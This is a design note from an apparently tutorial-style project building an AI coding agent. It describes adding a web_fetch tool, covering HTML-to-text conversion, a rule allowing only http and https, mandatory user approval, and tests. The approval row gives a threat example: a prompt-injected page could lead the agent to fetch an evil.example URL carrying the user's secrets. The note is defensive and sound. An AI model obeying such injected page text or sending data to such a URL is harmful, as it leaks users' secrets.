# 018 — Feature 17: Reading the web (web_fetch)

## Goal

Let the agent read documentation and web pages, as Claude Code's WebFetch and
Hermes Agent's web tools do.

## Decisions

| Question | Choice and why |
|----------|----------------|
| HTML handling | A small `html_to_text()`: drop `<script>`/`<style>`, turn block tags into line breaks, strip the rest, unescape entities. No new dependency; good enough for reading docs. |
| Non-HTML | Returned as-is (JSON, plain text). The loop's 20,000-character cap still applies. |
| Approval | **Always ask.** A fetched URL can carry data out: a prompt-injected page could ask the agent to fetch `https://evil.example/?q=<your secrets>`. You see the full URL before anything is sent. |
| Schemes | Only `http://` and `https://`. No `file://` or other tricks. |
| Search | Not included: web *search* needs a search API key. Fetching pages is the building block. |

## What was done

```
src/horde/builtin_tools.py  html_to_text(), web_fetch tool
tests/test_web.py           new: 3 tests
```

## How it was tested

`uv run pytest` gives **113 passed** (110 + 3 new): HTML to text (scripts, styles,
tags, entities, line breaks), approval required, `file://` rejected, HTML
response converted (with `httpx.get` faked). A real fetch of
`https://example.com` returned "Example Domain This domain is for use in
documentation examples…".

## What you should learn here

- **Network access is an exfiltration channel.** Any tool that sends data out
  (URLs, emails, API calls) needs the same care as tools that write files.
